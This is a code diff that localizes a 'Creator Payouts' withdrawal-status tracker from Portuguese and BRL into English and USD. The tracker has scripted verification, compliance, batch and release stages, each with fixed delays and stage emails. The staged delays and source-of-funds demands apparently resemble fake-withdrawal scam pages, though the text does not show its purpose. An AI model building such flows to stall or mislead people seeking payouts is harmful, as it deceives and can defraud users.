@@ -33,51 +33,51 @@ export const WITHDRAWAL_STAGES: WithdrawalStage[] = [
     id: "verification",
     days: 5,
     email: "withdrawal_verification",
-    label: "Verificação adicional",
-    badge: "Ação necessária",
-    headline: "Verificação adicional em andamento",
-    text: "Seu saque exige uma verificação adicional da conta. Conclua os itens pendentes abaixo para que nossa equipe valide sua conta. A verificação é concluída em até 5 dias úteis após a solicitação.",
+    label: "Additional Verification",
+    badge: "Action required",
+    headline: "Additional verification in progress",
+    text: "Your payout requires additional account verification. Complete the pending items below so our review team can validate your account. Verification is completed within 5 business days of the request.",
     processing:
-      "Seu saque está sendo processado. Nossa equipe está validando os dados da conta e a titularidade vinculada ao pagamento, e essa etapa pode levar até 5 dias úteis. Você não precisa enviar a solicitação novamente.",
+      "Your withdrawal is being processed. Our verification team is validating the account and ownership details linked to this payout, and we allow up to 5 business days to complete this stage. You do not need to submit the request again.",
     pending:
-      "A verificação adicional ainda não começou. Assim que esta etapa for aberta, nossa equipe será notificada e poderá levar até 5 dias úteis para validar os dados da conta.",
+      "Additional verification has not started yet. Once you open this stage, our team is notified and we allow up to 5 business days to validate your account details.",
   },
   {
     id: "compliance",
     days: 7,
     email: "withdrawal_compliance",
-    label: "Análise de conformidade",
-    badge: "Revisão reforçada",
-    headline: "Sua conta está em análise reforçada devido ao valor do saque",
-    text: "Saques de alto valor passam por uma análise reforçada antes da aprovação. Confirme a origem dos valores abaixo. Essa revisão é concluída em até 7 dias úteis.",
+    label: "Compliance Review",
+    badge: "Enhanced review",
+    headline: "Your account is under enhanced review due to the withdrawal amount",
+    text: "High-value creator payouts go through Enhanced Due Diligence before approval. Confirm the source of your funds below. Enhanced review is completed within 7 business days.",
     processing:
-      "Seu saque está em análise de conformidade. Por causa do valor, um analista está fazendo uma verificação reforçada da conta, e essa análise pode levar até 7 dias úteis. Seu saldo permanece reservado para este saque durante a revisão.",
+      "Your withdrawal is under compliance review. Because of the payout amount, an analyst is completing an Enhanced Due Diligence check on this account, and we allow up to 7 business days for this review. Your balance stays reserved for this payout during the review.",
     pending:
-      "A análise de conformidade ainda não começou. Quando esta etapa abrir, seu caso entra na fila de análise e o prazo é de até 7 dias úteis para concluir a revisão.",
+      "Compliance review has not started yet. When you open this stage, your case enters the analyst queue and we allow up to 7 business days to close the review.",
   },
   {
     id: "batch",
     days: 7,
     email: "withdrawal_batch",
-    label: "Lote de pagamento",
-    badge: "Aprovado",
-    headline: "Seu saque foi aprovado e entrou no próximo lote de pagamento",
-    text: "Os pagamentos são enviados em lotes programados. Seu valor está reservado para a próxima janela de lote, com envio em até 7 dias úteis. Nenhuma ação adicional é necessária.",
+    label: "Payout Batch",
+    badge: "Approved",
+    headline: "Your withdrawal has been approved and is now in the next payout batch",
+    text: "Payouts are transmitted in scheduled batches. Your funds are locked in for the next batch window, transmitted within 7 business days. No further action is required from you.",
     processing:
-      "Seu saque foi aprovado e está na fila do próximo lote de pagamento. Os pagamentos são enviados em janelas programadas, e o envio ao provedor pode levar até 7 dias úteis. Nenhuma ação adicional é necessária.",
+      "Your withdrawal has been approved and is queued in the next payout batch. Payouts are transmitted in scheduled batch windows, and we allow up to 7 business days for your batch to be sent to your provider. No further action is required from you.",
     pending:
-      "Seu lote de pagamento ainda não foi agendado. Quando esta etapa abrir, seu saque será colocado na próxima janela de lote, com prazo de até 7 dias úteis para transmissão.",
+      "Your payout batch has not been scheduled yet. When you open this stage, your withdrawal is placed in the next batch window, and we allow up to 7 business days for transmission.",
   },
   {
     id: "released",
     days: 0,
     email: "withdrawal_scheduled",
-    label: "Liberado",
-    badge: "Liberado",
-    headline: "Saque liberado para sua conta",
-    text: "Seu lote de pagamento foi transmitido. Dependendo do provedor, o crédito aparece em até 1 a 3 dias úteis.",
+    label: "Released",
+    badge: "Released",
+    headline: "Payout released to your account",
+    text: "Your payout batch has been transmitted. Depending on your provider, the credit posts within 1-3 business days.",
     processing:
-      "Seu saque foi liberado. O lote com este pagamento foi enviado ao seu provedor e, dependendo do banco ou carteira, o crédito aparece em até 1 a 3 dias úteis.",
+      "Your payout has been released. The batch containing this withdrawal was transmitted to your provider and, depending on your bank or wallet, the credit posts within 1-3 business days.",
     pending: "",
   },
 ];
@@ -194,11 +194,11 @@ export async function sendWithdrawalEmail(user: PipelineUser, template: string, 
 }
 
 function money(value: number) {
-  return value.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
+  return value.toLocaleString("en-US", { style: "currency", currency: "USD" });
 }
 
 function longDate(date: Date) {
-  return date.toLocaleDateString("pt-BR", { day: "numeric", month: "long", year: "numeric" });
+  return date.toLocaleDateString("en-US", { month: "long", day: "numeric", year: "numeric" });
 }
 
 export function WithdrawalTracker(props: {
@@ -267,12 +267,12 @@ export function WithdrawalTracker(props: {
 
   return (
     <div>
-      <h1 className="mb-4 text-2xl font-black text-[#0F172A]">Status do saque</h1>
+      <h1 className="mb-4 text-2xl font-black text-[#0F172A]">Withdrawal Status</h1>
 
       <section className="overflow-hidden rounded-[14px] bg-[#010101] p-5 text-white shadow-[0_18px_40px_rgba(1,1,1,.25)]">
         <div className="flex items-start justify-between gap-3">
           <div className="min-w-0">
-            <p className="text-[10px] font-black uppercase tracking-[0.18em] text-[#25F4EE]">Pagamentos de Criadores</p>
+            <p className="text-[10px] font-black uppercase tracking-[0.18em] text-[#25F4EE]">Creator Payouts</p>
             <p className="mt-1 text-[32px] font-black leading-none">{money(state.amount)}</p>
             <p className="mt-2 truncate text-[11px] font-bold text-white/60">Ref {state.reference} · {state.method}</p>
           </div>
@@ -280,7 +280,7 @@ export function WithdrawalTracker(props: {
         </div>
 
         <div className="mt-5 rounded-[10px] border border-white/10 bg-white/[0.06] p-4">
-          <p className="text-[10px] font-black uppercase tracking-[0.16em] text-white/50">Etapa atual</p>
+          <p className="text-[10px] font-black uppercase tracking-[0.16em] text-white/50">Current stage</p>
           <p className="mt-1 text-lg font-black">{stage.label}</p>
           {isFinal ? (
             <p className="mt-2 text-sm font-bold leading-6 text-white/70">{stage.processing}</p>
@@ -305,14 +305,14 @@ export function WithdrawalTracker(props: {
 
         {stage.id === "released" && (
           <div className="mt-4 space-y-3 rounded-[8px] bg-[#F8FAFC] p-4 text-sm">
-            <TrackerLine label="Valor liberado" value={money(state.amount)} />
-            <TrackerLine label="Destino" value={state.method} />
-            <TrackerLine label="Liberado em" value={longDate(new Date(state.stageStartedAt))} />
+            <TrackerLine label="Amount released" value={money(state.amount)} />
+            <TrackerLine label="Destination" value={state.method} />
+            <TrackerLine label="Released on" value={longDate(new Date(state.stageStartedAt))} />
           </div>
         )}
 
         <p className="mt-5 text-[11px] font-bold leading-5 text-[#94A3B8]">
-          Solicitado em {longDate(new Date(state.requestedAt))} · Referência {state.reference}. As atualizações de status também são enviadas para o seu e-mail em cada etapa.
+          Requested on {longDate(new Date(state.requestedAt))} · Reference {state.reference}. Status updates are also sent to your email at every stage.
         </p>
       </section>
     </div>
